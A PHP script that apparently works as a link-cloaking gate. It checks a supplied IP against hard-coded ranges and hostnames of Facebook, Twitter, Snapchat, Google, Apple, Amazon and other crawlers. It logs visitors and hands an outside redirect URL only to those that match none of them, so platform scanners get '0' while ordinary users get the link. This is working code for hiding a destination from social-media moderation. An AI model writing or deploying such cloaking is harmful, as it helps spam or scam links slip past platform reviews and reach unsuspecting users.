<?php
 
 $ip = ip2long($_GET['ip']);
  
  
 $chel = 1;
  
  
 $log_file="insta-ip.txt";
 $f=fopen($log_file,"a+");
 $ip111=getenv("REMOTE_ADDR");
  
 $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
  
  
 $range_low = ip2long("173.252.64.0");
 $range_high = ip2long("173.252.127.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("66.220.144.0");
 $range_high = ip2long("66.220.159.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("85.17.59.0");
 $range_high = ip2long("85.17.59.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("199.201.64.0");
 $range_high = ip2long("199.201.67.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("64.74.215.0");
 $range_high = ip2long("64.74.215.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("54.191.244.0");
 $range_high = ip2long("54.191.244.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("54.69.76.0");
 $range_high = ip2long("54.69.76.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("69.171.224.0");
 $range_high = ip2long("69.171.255.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("69.63.176.0");
 $range_high = ip2long("69.63.191.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("74.119.76.0");
 $range_high = ip2long("74.119.79.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("204.15.20.0");
 $range_high = ip2long("204.15.23.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("208.185.168.128");
 $range_high = ip2long("208.185.168.135");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("70.105.81.144");
 $range_high = ip2long("70.105.81.159");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("23.101.61.0");
 $range_high = ip2long("23.101.61.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
  
  
 $range_low = ip2long("104.40.0.0");
 $range_high = ip2long("104.47.255.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
 }
 else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . 'google' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
    
 if(preg_match("#" . 'trendiction' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . 'your-server' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . 'amazonaws' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . '.ip-' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . 'linode' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . 'twttr' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 if(preg_match("#" . 'applebot' ."#is", $host))
     {
 fputs($f, ".");
     }
     else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("17.142.151.0");
 $range_high = ip2long("17.142.151.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");  
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("199.59.148.0");
 $range_high = ip2long("199.59.148.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("199.16.156.0");
 $range_high = ip2long("199.16.156.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("17.142.151.0");
 $range_high = ip2long("17.142.151.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("23.96.208.0");
 $range_high = ip2long("23.96.208.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("149.102.90.0");
 $range_high = ip2long("149.102.130.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("4.71.170.0");
 $range_high = ip2long("4.71.170.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 $range_low = ip2long("150.164.196.0");
 $range_high = ip2long("150.164.196.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("153.120.3.0");
 $range_high = ip2long("153.120.3.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("188.166.209.0");
 $range_high = ip2long("188.166.209.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("62.0.1.0");
 $range_high = ip2long("62.0.1.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("91.228.167.0");
 $range_high = ip2long("91.228.167.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("92.246.16.0");
 $range_high = ip2long("92.246.16.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 // SNAP CHAT
  
 $range_low = ip2long("104.193.185.0");
 $range_high = ip2long("104.193.185.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("63.251.222.0");
 $range_high = ip2long("63.251.222.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("64.74.32.0");
 $range_high = ip2long("64.74.32.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 // TWITTER
  
 $range_low = ip2long("104.244.40.0");
 $range_high = ip2long("104.244.47.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("185.45.5.0");
 $range_high = ip2long("185.45.6.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 $range_low = ip2long("188.64.224.0");
 $range_high = ip2long("188.64.231.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("199.96.56.0");
 $range_high = ip2long("199.96.62.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 $range_low = ip2long("202.160.128.0");
 $range_high = ip2long("202.160.131.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("209.237.192.0");
 $range_high = ip2long("209.237.223.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("69.195.160.0");
 $range_high = ip2long("69.195.191.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
 $range_low = ip2long("103.252.112.0");
 $range_high = ip2long("103.252.114.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 $range_low = ip2long("64.63.0.0");
 $range_high = ip2long("64.63.0.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
 $range_low = ip2long("199.59.148.0");
 $range_high = ip2long("199.59.150.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
 $range_low = ip2long("199.16.156.0");
 $range_high = ip2long("199.16.156.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
 $range_low = ip2long("192.44.69.0");
 $range_high = ip2long("192.44.69.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
 $range_low = ip2long("192.133.76.0");
 $range_high = ip2long("192.133.76.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 // SNAP ?
  
 $range_low = ip2long("35.187.132.0");
 $range_high = ip2long("35.187.132.255");
 if ($ip >= $range_low && $ip <= $range_high) {
 fputs($f, ".");
  
 }
 else {
 $chel = $chel + 1;
 }
  
  
 if ($chel == 54) {
  
 fputs($f, "\r\n".$ip111.' '.$host. ' '.date("Y-m-d H:i:s")."OK! - redir\r\n");
 echo 'https://alla-modeller.com/tH3bkJLK';
  
  
 } else {
    
echo '0';
    
    
 }
  
  
  
fclose($f);